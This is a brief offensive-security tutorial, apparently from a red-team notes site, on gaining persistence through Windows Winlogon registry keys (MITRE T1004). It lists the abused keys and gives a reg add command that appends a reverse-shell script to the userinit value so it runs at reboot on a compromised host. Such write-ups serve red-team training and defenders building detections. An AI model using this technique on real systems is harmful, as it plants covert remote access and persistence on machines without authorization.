# Windows Logon Helper

## Windows Logon Helper

> Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
>
> [https://attack.mitre.org/techniques/T1004/](https://attack.mitre.org/techniques/T1004/)

Commonly abused Winlogon registry keys and value for persistence are:

```
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```

{% hint style="info" %}
HKCU can also be replaced with HKLM for a system wide persistence, if you have admin privileges.
{% endhint %}

### Execution

Let's run through the techqnique abusing the `userinit` subkey.

Let's see what's currently held at the `userinit`:

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lya1sc70CyELL3aXL88%2F-LytPFFTkLOYF0XCvDwl%2Fimage.png?alt=media\&token=63b71916-7af7-4344-b18f-89bd21463d6b)

Let's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to be launched when the compromised machine reboots:

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lya1sc70CyELL3aXL88%2F-LytPUJ2Czi6SdVqhNsp%2Fimage.png?alt=media\&token=8a7ddbac-4da0-4b29-a854-15397bdbabf2)

Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lya1sc70CyELL3aXL88%2F-LytPa1XD-Ek5oBepsrF%2Fimage.png?alt=media\&token=79bc9f1e-4f08-4a09-96a4-4a667b592eec)

### References

{% embed url="https://attack.mitre.org/techniques/T1004/" %}
